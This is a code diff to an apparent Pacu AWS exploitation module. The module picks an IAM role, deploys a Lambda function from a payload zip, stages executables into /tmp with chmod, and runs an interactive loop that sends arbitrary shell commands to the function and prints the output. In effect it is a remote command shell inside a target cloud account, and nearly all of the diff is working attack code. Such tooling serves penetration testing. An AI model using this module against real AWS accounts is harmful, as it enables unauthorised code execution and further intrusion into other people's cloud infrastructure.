@@ -23,43 +23,59 @@ parser = argparse.ArgumentParser(add_help=False, description=module_info['descri
 parser.add_argument('--vpc', help='VPC to target when staging the Lambda function')
 parser.add_argument(
     '--code', 
-    default='',
+    default='modules/lambda_executor/payload.zip',
     help='Zip file that contains the source code of the Lambda function')
 
 FUNC_NAME = 'function_executor'
 
 def get_code(zip_file):
     path = Path(zip_file)
-    print(path)
     if not path.exists():
         return ''
     with open(r'{}'.format(zip_file), 'rb') as code_file:
         out = code_file.read()
     return out
 
-def get_role():
-    return 'arn:aws:iam::216825089941:role/AlexTestRole'
-
+def get_role(pacu):
+    if pacu.fetch_data(['IAM', 'Roles'], 'enum_users_roles_policies_groups', '--roles') is False:
+        return ''
+    session = pacu.get_active_session()
+    roles = session.IAM['Roles']
+    pacu.print('  Select Lambda Execution Role: ')
+    for role in roles:
+        if pacu.input('    {} (y/n)? '.format(role['RoleName'])) == 'y':
+            return role['Arn']
+    return ''
 
 def get_handler():
     return 'lambda_func.lambda_handler'
 
-
 def init_function(client, role, handler, code):
-    client.create_function(
-        FunctionName=FUNC_NAME,
-        Runtime='python3.6',
-        Role=role,
-        Handler=handler,
-        Code={'ZipFile':code},
-        Timeout=300,
-    )
-    return
+    try:
+        client.create_function(
+            FunctionName=FUNC_NAME,
+            Runtime='python3.6',
+            Role=role,
+            Handler=handler,
+            Code={'ZipFile':code},
+            Timeout=300,
+        )
+        return True
+    except ClientError:
+        return False
 
 def cleanup(client):
     client.delete_function(FunctionName=FUNC_NAME)
     return
 
+def send_command(client, command):
+    try:
+        return client.invoke(
+            FunctionName=FUNC_NAME,
+            Payload=json.JSONEncoder().encode({"command":command})
+        )
+    except ClientError as error:
+        return error.response['Error']['Code']
 
 
 def main(args, pacu):
@@ -67,35 +83,33 @@ def main(args, pacu):
     pacu.print('Starting module')
 
     client = pacu.get_boto3_client('lambda', 'ap-northeast-2')
-    init_function(client, get_role(), get_handler(), get_code(args.code))
+    if not init_function(
+        client, get_role(pacu), get_handler(), get_code(args.code)):
+        return {'fail': 'Unable to create Lambda function'}
 
-    client.invoke(FunctionName=FUNC_NAME, Payload=json.JSONEncoder().encode({"command":"cp -r exec /tmp"}))
-    client.invoke(FunctionName=FUNC_NAME, Payload=json.JSONEncoder().encode({"command":"chmod -R a+x /tmp"}))
-    client.invoke(FunctionName=FUNC_NAME, Payload=json.JSONEncoder().encode({"command":"PATH=$PATH:/tmp/tmp/nmap/bin"}))
+    pacu.print('  Function Creation Successful')
+    pacu.print('  Initialzing Payload to /tmp...')
+    send_command(client, 'cp -r exec /tmp')
+    send_command(client, 'chmod -R a+x /tmp')
 
     while True:
         command = pacu.input('  Enter Command: ')
         if command == 'exit':
             break
-
-        payload = {"command":command}
-        kwargs = {
-            'FunctionName':FUNC_NAME,
-            'Payload':json.JSONEncoder().encode(payload)
-        }
-
-        response = client.invoke(**kwargs)
+        response = send_command(client, command)
         decoded = response['Payload'].read().decode()
         decoded_json = json.JSONDecoder().decode(decoded)
         if 'body' in decoded_json:
             pacu.print('OUTPUT RETURNED:\n{}'.format(decoded_json['body']))
         else:
-            pacu.print('  Output not found')
+            pacu.print('  Unexpected response format')
     
     cleanup(client)
-    pacu.print('Ending module')
-    return {}
+    return {'success': 'Lambda Function Execution Successful'}
 
 def summary(data, pacu_main):
-    out = ''
-    return out
+    if 'fail' in data:
+        out = data['fail']
+    elif 'success' in data:
+        out = data['success']
+    return '  ' + out
